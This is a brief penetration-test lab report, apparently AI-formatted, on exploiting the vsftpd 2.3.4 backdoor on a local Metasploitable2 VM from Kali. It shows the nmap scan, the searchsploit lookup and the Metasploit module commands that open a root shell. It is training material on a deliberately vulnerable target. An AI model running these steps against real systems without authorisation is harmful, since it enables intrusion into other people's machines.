@@ -1,0 +1,58 @@
+ * The following is AI generated formatted version after user input of the AAR *
+
+
+PENETRATION TEST REPORT: Live Action Lab #001
+Date: May 22, 2025
+Operator: $$$$$$$$
+Target: Metasploitable2 (local VM)
+Attacker: Kali Linux VM
+
+Phase 1: Recon
+
+Verified root with sudo su
+
+Verified user (whoami) → root
+
+Identified target IP on Metasploitable2 with ip a
+
+Phase 2: Target Discovery
+
+Scanned target with:
+
+bash
+Copy
+Edit
+nmap -sV -O <target-IP>
+Open port detected: 21/tcp vsftpd 2.3.4
+
+Phase 3: Exploit Research
+
+searchsploit vsftpd → confirmed 2.3.4 backdoor vulnerability
+
+Verified exploit in msfconsole
+
+Phase 4: Exploitation
+
+Used:
+
+bash
+Copy
+Edit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <target-IP>
+run
+Command shell session opened
+
+Phase 5: Post Exploitation
+
+Verified root access on target
+
+Navigated file system, gathered system intel
+
+Phase 6: Cleanup
+
+Killed session: sessions -k 1
+
+Exited all shells
+
+Powered down Kali and Metasploitable2
